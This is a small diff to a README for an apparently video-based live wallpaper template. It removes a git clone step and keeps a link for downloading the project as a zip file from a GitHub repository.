@@ -20,6 +20,3 @@ Read full documentation in the [Wiki]([https://github.com/USERNAME/REPO/wiki](ht
 
 Download project.zip file
 [Download file](https://github.com/Git-Aayush-Kushwaha/video-to-apk-wallpaper/blob/main/Alpine.zip)
-### 1️⃣ Clone Repository
-```bash
-git clone https://github.com/your-username/Video-Live-Wallpaper-Template.git
